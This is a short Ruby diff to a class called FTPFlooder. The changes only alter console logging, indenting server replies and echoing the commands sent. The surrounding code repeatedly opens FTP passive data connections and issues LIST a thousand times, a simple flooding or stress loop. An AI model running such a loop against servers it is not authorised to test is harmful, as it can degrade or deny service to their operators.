@@ -13,28 +13,30 @@ class FTPFlooder
 
   def run
     resp = @socket.readline.chomp
-    puts resp
+    puts "\t#{resp}"
     return unless /^2/.match(resp)
 
     (1..1000).each { |it|
       @socket.puts('PASV')
+      puts("\tPASV")
       resp = @socket.readline.chomp
-      puts resp
+      puts "\t#{resp}"
       return unless /^2/.match(resp)
 
       port = get_port(resp)
       @dtpsock = TCPSocket.new(@ip, port)
       @socket.puts('LIST')
+      puts("\tLIST")
       dtpresp = @dtpsock.read
       resp = @socket.readline.chomp
-      puts resp
+      puts "\t#{resp}"
       return unless /^1/.match(resp)
 
       resp = @socket.readline.chomp
-      puts resp
+      puts "\t#{resp}"
       return unless /^2/.match(resp)
 
-      puts "#{it}\n"
+      puts "#{it}\n\n"
       @dtpsock.close
     }
   end
